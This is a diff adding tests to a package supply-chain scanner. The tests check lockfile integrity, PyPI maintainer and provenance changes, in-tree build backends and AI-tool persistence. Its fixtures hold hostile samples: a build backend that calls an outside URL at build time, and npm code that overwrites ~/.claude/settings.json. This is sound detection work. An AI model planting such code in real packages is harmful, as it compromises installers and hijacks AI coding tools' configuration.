@@ -100,6 +100,133 @@ describe("checkPackage", () => {
     expect(called).toBe(false);
   });
 
+  it("lockfile fast path verifies integrity against the registry", async () => {
+    const sri = "sha512-" + "A".repeat(86) + "==";
+    const info: NpmPackageInfo = { ...canaryInfo, versions: { "1.0.2": { ...canaryInfo.versions["1.0.2"]!, integrity: sri } } };
+    const lock = new LockfileIndex();
+    lock.add("npm", "color-fn-utils", "1.0.2", sri);
+    const ok = await checkPackage({ ecosystem: "npm", name: "color-fn-utils", versionSpec: "^1.0.0" }, deps(npmFake({ "color-fn-utils": info })), { lockfile: lock });
+    expect(ok).toMatchObject({ verdict: "allow", fastPath: "lockfile", version: "1.0.2" });
+    expect(ok.evidence.lockfile.integrity).toBe("verified");
+
+    const tampered = new LockfileIndex();
+    tampered.add("npm", "color-fn-utils", "1.0.2", "sha512-" + "B".repeat(86) + "==");
+    const bad = await checkPackage({ ecosystem: "npm", name: "color-fn-utils", versionSpec: "1.0.2" }, deps(npmFake({ "color-fn-utils": info }, { "t://c": canaryTgz })), { lockfile: tampered });
+    expect(bad.fastPath).toBeUndefined();
+    expect(bad.verdict).toBe("hold");
+    expect(bad.hits.find((h) => h.id === "L01")).toMatchObject({ name: "lockfile_integrity_mismatch", weight: 60 });
+    expect(bad.hits.map((h) => h.id)).toContain("R09"); // full check ran
+
+    // registry unreachable → fast path as before, but integrity is not claimed
+    const down: NpmSource = { packument: async () => { throw new SourceError("npm registry", "down"); }, weeklyDownloads: async () => 0, tarball: async () => null };
+    const un = await checkPackage({ ecosystem: "npm", name: "color-fn-utils", versionSpec: "1.0.2" }, deps(down), { lockfile: lock });
+    expect(un).toMatchObject({ verdict: "allow", fastPath: "lockfile" });
+    expect(un.evidence.lockfile.integrity).toBe("unchecked");
+  });
+
+  it("PyPI lockfile fast path: PEP 440 range + file sha256", async () => {
+    const h = "a".repeat(64);
+    const pypi: PypiSource = {
+      project: async () => ({ name: "requests", latest: "2.32.3", releases: { "2.32.3": { version: "2.32.3", hasWheel: true, files: [{ filename: "requests-2.32.3.tar.gz", packagetype: "sdist", sha256: h }] } } }),
+      weeklyDownloads: async () => 1e7,
+      sdist: async () => null,
+    };
+    const lock = new LockfileIndex();
+    lock.add("pypi", "requests", "2.32.3", `sha256:${h}`);
+    const r = await checkPackage({ ecosystem: "pypi", name: "requests", versionSpec: ">=2.30,<3" }, { ...deps(npmFake({})), pypi }, { lockfile: lock });
+    expect(r).toMatchObject({ verdict: "allow", fastPath: "lockfile" });
+    expect(r.evidence.lockfile.integrity).toBe("verified");
+    const bad = new LockfileIndex();
+    bad.add("pypi", "requests", "2.32.3", `sha256:${"f".repeat(64)}`);
+    const r2 = await checkPackage({ ecosystem: "pypi", name: "requests", versionSpec: "==2.32.3" }, { ...deps(npmFake({})), pypi }, { lockfile: bad });
+    expect(r2.hits.map((x) => x.id)).toContain("L01");
+  });
+
+  describe("PyPI worm signals", () => {
+    const sd = (v: string, time: string) => ({ version: v, time, hasWheel: true, files: [{ filename: `pkg-${v}.tar.gz`, packagetype: "sdist", sha256: "a".repeat(64) }, { filename: `pkg-${v}-py3-none-any.whl`, packagetype: "bdist_wheel" }] });
+    const project = { name: "pkg", latest: "2.0.1", created: daysAgo(2000), people: ["attacker@evil.example"], repositoryUrl: "https://github.com/o/pkg", releases: { "2.0.0": sd("2.0.0", daysAgo(30)), "2.0.1": sd("2.0.1", hoursAgo(5)) } };
+    const fake = (prov: Record<string, string | null>, people: Record<string, string[]> = { "2.0.0": ["dev@pkg.example"] }): PypiSource & { calls: string[] } => {
+      const calls: string[] = [];
+      return {
+        calls,
+        project: async () => project,
+        weeklyDownloads: async () => 2_000_000,
+        sdist: async () => null,
+        release: async (_n, v) => {
+          calls.push(`release ${v}`);
+          return people[v] ? { version: v, people: people[v]! } : null;
+        },
+        provenance: async (_n, v, file) => {
+          calls.push(`prov ${v} ${file}`);
+          const p = prov[v];
+          return p === undefined || p === null ? null : { publisher: p };
+        },
+      };
+    };
+
+    it("R07 fires when a fresh release names new people; R14 when PEP 740 provenance disappears", async () => {
+      const pypi = fake({ "2.0.0": "GitHub:o/pkg" });
+      const r = await checkPackage({ ecosystem: "pypi", name: "pkg" }, { ...deps(npmFake({})), pypi });
+      const ids = r.hits.map((h) => h.id);
+      expect(ids).toEqual(expect.arrayContaining(["R07", "R14"]));
+      expect(r.hits.find((h) => h.id === "R07")!.detail).toContain("attacker@evil.example");
+      expect(r.hits.find((h) => h.id === "R14")!.detail).toContain("PEP 740");
+      expect(pypi.calls).toEqual(expect.arrayContaining(["release 2.0.0", "prov 2.0.1 pkg-2.0.1.tar.gz", "prov 2.0.0 pkg-2.0.0.tar.gz"]));
+      expect(pypi.calls).not.toContain("release 2.0.1"); // latest's people come from the project JSON
+    });
+
+    it("R07 fires on a changed Trusted Publisher; quiet when nothing changed", async () => {
+      const moved = await checkPackage({ ecosystem: "pypi", name: "pkg" }, { ...deps(npmFake({})), pypi: fake({ "2.0.0": "GitHub:o/pkg", "2.0.1": "GitHub:mallory/fork" }, { "2.0.0": ["attacker@evil.example"] }) });
+      expect(moved.hits.find((h) => h.id === "R07")?.detail).toContain("GitHub:mallory/fork");
+      expect(moved.hits.map((h) => h.id)).not.toContain("R14");
+      const same = await checkPackage({ ecosystem: "pypi", name: "pkg" }, { ...deps(npmFake({})), pypi: fake({ "2.0.0": "GitHub:o/pkg", "2.0.1": "GitHub:o/pkg" }, { "2.0.0": ["attacker@evil.example"] }) });
+      expect(same.hits.map((h) => h.id)).not.toEqual(expect.arrayContaining(["R07"]));
+      expect(same.hits.map((h) => h.id)).not.toContain("R14");
+    });
+
+    it("old, unpopular releases skip the extra lookups", async () => {
+      const old = { ...project, releases: { ...project.releases, "2.0.1": sd("2.0.1", daysAgo(20)) } };
+      const pypi: PypiSource = { ...fake({}), project: async () => old, weeklyDownloads: async () => 50 };
+      const calls: string[] = [];
+      pypi.release = async (_n, v) => (calls.push(v), null);
+      pypi.provenance = async (_n, v) => (calls.push(v), null);
+      const r = await checkPackage({ ecosystem: "pypi", name: "pkg" }, { ...deps(npmFake({})), pypi });
+      expect(r.evidence.registry?.previousVersion).toBe("2.0.0");
+      expect(calls).toEqual([]);
+    });
+  });
+
+  it("PyPI sdist-only release with an in-tree build backend → R08 with a clear detail", async () => {
+    const tgz = makeTgz({
+      "evil-1.0/pyproject.toml": `[build-system]\nbuild-backend = "backend"\nbackend-path = ["."]\n`,
+      "evil-1.0/backend.py": "import requests\nrequests.get('https://x.example/c')\n",
+    });
+    const pypi: PypiSource = {
+      project: async () => ({ name: "evil", latest: "1.0", created: daysAgo(400), repositoryUrl: "https://github.com/e/evil", releases: { "1.0": { version: "1.0", time: daysAgo(300), hasWheel: false, sdistUrl: "s://evil" } } }),
+      weeklyDownloads: async () => 500,
+      sdist: async () => tgz,
+    };
+    const r = await checkPackage({ ecosystem: "pypi", name: "evil" }, { ...deps(npmFake({})), pypi });
+    expect(r.hits.find((h) => h.id === "R08")?.detail).toContain('in-tree backend "backend"');
+    expect(r.hits.map((h) => h.id)).toContain("R09");
+    expect(r.evidence.registry?.buildBackend?.inTree).toBe(true);
+  });
+
+  it("R15 from package code without install scripts; benign package stays quiet", async () => {
+    const mk = (): NpmPackageInfo => ({
+      ...expressInfo,
+      versions: { "5.1.0": { ...expressInfo.versions["5.1.0"]!, tarball: "t://p" } },
+      distTags: { latest: "5.1.0" },
+    });
+    const worm = makeTgz({ "package/package.json": "{}", "package/index.js": "const fs=require('fs'),os=require('os'),p=require('path');fs.writeFileSync(p.join(os.homedir(),'.claude','settings.json'),'{}')" });
+    const r = await checkPackage({ ecosystem: "npm", name: "express" }, deps(npmFake({ express: mk() }, { "t://p": worm }, { express: 4e7 })));
+    expect(r.hits.find((h) => h.id === "R15")).toMatchObject({ detail: "package code writes to Claude Code config in index.js — AI-tool persistence pattern" });
+    expect(r.hits.find((h) => h.id === "R15")?.discounted).toBeUndefined();
+    const benign = makeTgz({ "package/package.json": "{}", "package/index.js": "module.exports = require('./lib/app')", "package/lib/app.js": "exports.x = 1", "package/README.md": "Configure .claude/settings.json" });
+    const ok = await checkPackage({ ecosystem: "npm", name: "express" }, deps(npmFake({ express: mk() }, { "t://p": benign }, { express: 4e7 })));
+    expect(ok).toMatchObject({ verdict: "allow", score: 0 });
+  });
+
   it("worm pattern: hijacked new version of a popular package", async () => {
     const info: NpmPackageInfo = {
       ...expressInfo,
